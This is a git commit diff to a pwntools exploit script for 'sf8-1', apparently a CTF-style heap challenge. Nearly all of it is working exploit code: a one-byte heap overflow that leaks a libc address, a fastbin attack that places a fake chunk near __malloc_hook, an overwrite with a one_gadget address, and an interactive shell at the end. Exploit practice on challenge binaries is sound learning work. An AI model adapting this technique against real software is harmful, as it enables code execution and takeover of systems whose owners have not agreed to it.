edb1fb776a4ad6bd7de4649e3fee31bb43b22625
Minjea Lee <gabe0529@naver.com>
2022-05-05 01:14:38 +0900

    sf8-1

--- sf/sf8-1/ex.py
+++ sf/sf8-1/ex.py
@@ -3,7 +3,7 @@ from pwn import *
 p = process("./sf8-1")
 # elf = 
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
 
 one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
 
@@ -12,9 +12,6 @@ def allocate(size):
     p.sendline("1")
     p.recvuntil("Size: ")
     p.sendline(str(size))
-    p.recvuntil("Allocate Index ")
-    index = int(p.recvline().strip())
-    return index
 
 def fill(index, size, content):
     p.recvuntil("Command: ")
@@ -39,18 +36,18 @@ def dump(index):
     p.sendline(str(index))
     p.recvuntil("Content: \n")
 
-alloc_0 = allocate(0x18)
-alloc_1 = allocate(0x80)  #mm
-alloc_2 = allocate(0x10)
-alloc_3 = allocate(0x60)
-free(alloc_1)
+allocate(0x18)
+allocate(0x80)  #mm
+allocate(0x10)
+allocate(0x60)
+free(1)
 # input()
 
-fill(alloc_0, 0x19, b'A'*0x18 + b'\x93')
+fill(0, 0x19, b'A'*0x18 + b'\x93')
 
-alloc_1 = allocate(0x80)
+allocate(0x80)
 # input()
-dump(alloc_1)  # fd out
+dump(1)  # fd out
 
 leak = u64(p.recv(8))
 print(hex(leak))
@@ -67,23 +64,22 @@ pay = b''
 pay += p64(0)*3 + p64(0x71) 
 pay += p64(malloc_hook - 0x30 + 0x8 + 0x5) # -> 7f 
 
-fill(alloc_2, 0x28, pay)
+fill(2, 0x28, pay)
 
-input("1")
-
-alloc_3 = allocate(0x60)
-alloc_4 = allocate(0x60)
+allocate(0x60)
+allocate(0x60)
 
 pay = b''
 pay += b'\x00'*0x13
-pay += p64(libc_base + one[0])
+pay += p64(libc_base + one[1])
 
-fill(alloc_4, 0x29, pay)
+fill(4, 0x13 + 0x8, pay)
 
 print(hex(malloc_hook))
 
 # alloc(0x10)
-
 input()
+
+allocate(0x60)
 
 p.interactive()
